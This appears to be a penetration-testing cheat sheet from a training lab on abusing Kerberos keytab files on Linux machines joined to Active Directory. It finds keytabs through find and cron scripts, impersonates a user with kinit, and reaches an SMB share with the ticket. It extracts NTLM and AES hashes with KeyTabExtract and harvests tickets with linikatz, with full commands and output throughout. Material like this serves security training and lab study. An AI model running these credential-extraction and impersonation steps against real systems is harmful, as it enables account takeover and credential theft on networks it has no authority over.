---
title: "PTT : KeyTab File Abuse"
date: 2025-11-29 21:23:46
categories:
  - Active Directory
  - Linux
  - Post Exploitation
  - Pass the Ticket (Ptt)
  - KeyTab File Abuse
tags:
  - klist
  - kinit
  - KeyTabExtract
---

# Finding Keytab files

#### Note:

`➜ To use a keytab file, we must have read and write (rw) privileges on the file.`

`➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can't read it without root permission.`

#### Using Find

```bash
find / -name *keytab* -ls 2>/dev/null

...SNIP...

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

#### Identifying Keytab files in Cronjobs

```bash
crontab -l

# Edit this file to introduce tasks to be run by cron.
#
...SNIP...
#
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```bash
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

# KeyTab File Abuse

## Impersonating User With KeyTab

#### Listing KeyTab file information

```bash
klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

#### Impersonating Target User

`➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.`

```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```bash
klist

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

#### Example

Connecting to SMB Share as Carlos

```bash
smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

## Extract NTLM Hash From Keytab

#### Extracting KeyTab hashes with KeyTabExtract

[KeyTabExtract](<https://github.com/sosdave/KeyTabExtract>) will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

`➜ Then we can perform pass hash attack or crack the ntlm hash`

# Automated Harvesting Of Ccache Files

## Linikatz

`➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.`

```bash
[!bash!]$ /opt/linikatz.sh

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
```
